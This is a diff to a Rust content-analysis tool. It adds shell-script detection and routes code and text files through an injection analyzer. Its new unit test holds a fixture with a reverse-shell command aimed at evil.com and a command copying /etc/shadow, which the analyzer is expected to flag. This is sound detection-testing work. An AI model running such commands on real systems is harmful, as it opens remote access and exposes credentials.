@@ -32,6 +32,7 @@ pub enum FileType {
     JavaScript,
     TypeScript,
     Rust,
+    Shell,
     Markdown,
     Text,
     YAML,
@@ -239,17 +240,29 @@ pub fn analyze_content(path: &Path, content: &str) -> Result<AnalysisResult, Box
     
     // Run appropriate analyzers based on file type
     match file_type {
-        FileType::Python | FileType::JavaScript | FileType::TypeScript => {
-            // Load custom allowlist if available
-            let custom_allowlist = analyzers::code::CodeAnalyzer::load_custom_allowlist();
-            let code_analyzer = analyzers::code::CodeAnalyzer::with_custom_allowlist(custom_allowlist);
-            let mut result = code_analyzer.analyze(path, content);
-            issues.append(&mut result.issues);
+        FileType::Python | FileType::JavaScript | FileType::TypeScript | FileType::Rust | FileType::Shell | FileType::YAML | FileType::JSON => {
+            // Run code analyzer for code files
+            if matches!(file_type, FileType::Python | FileType::JavaScript | FileType::TypeScript) {
+                let custom_allowlist = analyzers::code::CodeAnalyzer::load_custom_allowlist();
+                let code_analyzer = analyzers::code::CodeAnalyzer::with_custom_allowlist(custom_allowlist);
+                let mut result = code_analyzer.analyze(path, content);
+                issues.append(&mut result.issues);
+            }
+            
+            // Run injection analyzer for all code files (including shell scripts)
+            let injection_analyzer = analyzers::injection::InjectionAnalyzer::new();
+            let mut injection_result = injection_analyzer.analyze(path, content);
+            issues.append(&mut injection_result.issues);
         }
         FileType::Markdown | FileType::Text => {
             let text_analyzer = analyzers::text::TextAnalyzer::new();
             let mut result = text_analyzer.analyze(path, content);
             issues.append(&mut result.issues);
+            
+            // Also run injection analyzer on text files (they might contain malicious code snippets)
+            let injection_analyzer = analyzers::injection::InjectionAnalyzer::new();
+            let mut injection_result = injection_analyzer.analyze(path, content);
+            issues.append(&mut injection_result.issues);
         }
         _ => {} // No specific analyzer for this file type
     }
@@ -428,6 +441,7 @@ pub fn detect_file_type(path: &Path) -> FileType {
             "js" | "jsx" => FileType::JavaScript,
             "ts" | "tsx" => FileType::TypeScript,
             "rs" => FileType::Rust,
+            "sh" | "bash" | "zsh" => FileType::Shell,
             "md" => FileType::Markdown,
             "txt" => FileType::Text,
             "yaml" | "yml" => FileType::YAML,
@@ -447,6 +461,7 @@ fn is_supported_file(path: &Path) -> bool {
             | FileType::JavaScript
             | FileType::TypeScript
             | FileType::Rust
+            | FileType::Shell
             | FileType::Markdown
             | FileType::Text
             | FileType::YAML
@@ -524,6 +539,9 @@ mod tests {
         assert_eq!(detect_file_type(&PathBuf::from("test.js")), FileType::JavaScript);
         assert_eq!(detect_file_type(&PathBuf::from("test.ts")), FileType::TypeScript);
         assert_eq!(detect_file_type(&PathBuf::from("test.rs")), FileType::Rust);
+        assert_eq!(detect_file_type(&PathBuf::from("test.sh")), FileType::Shell);
+        assert_eq!(detect_file_type(&PathBuf::from("test.bash")), FileType::Shell);
+        assert_eq!(detect_file_type(&PathBuf::from("test.zsh")), FileType::Shell);
         assert_eq!(detect_file_type(&PathBuf::from("test.md")), FileType::Markdown);
     }
     
@@ -563,6 +581,26 @@ this comprehensive analysis delves into the multifaceted aspects.
         // Should detect AI patterns
         let has_ai_pattern = result.issues.iter().any(|i| i.message.contains("AI"));
         assert!(has_ai_pattern);
+    }
+
+    #[test]
+    fn test_analyze_content_shell() {
+        let content = r#"#!/bin/bash
+# This script contains malicious patterns
+bash -i >& /dev/tcp/evil.com/8080 0>&1
+cat /etc/shadow > /tmp/secrets.txt
+"#;
+        let result = analyze_content(&PathBuf::from("test.sh"), content).unwrap();
+        
+        assert_eq!(result.file_type, FileType::Shell);
+        assert!(result.issues.len() > 0);
+        
+        // Should detect reverse shell and secret file access
+        let has_reverse_shell = result.issues.iter().any(|i| i.rule.as_ref() == Some(&"reverse_shell".to_string()));
+        let has_secret_file = result.issues.iter().any(|i| i.rule.as_ref() == Some(&"secret_file_access".to_string()));
+        
+        assert!(has_reverse_shell);
+        assert!(has_secret_file);
     }
 
     #[test]
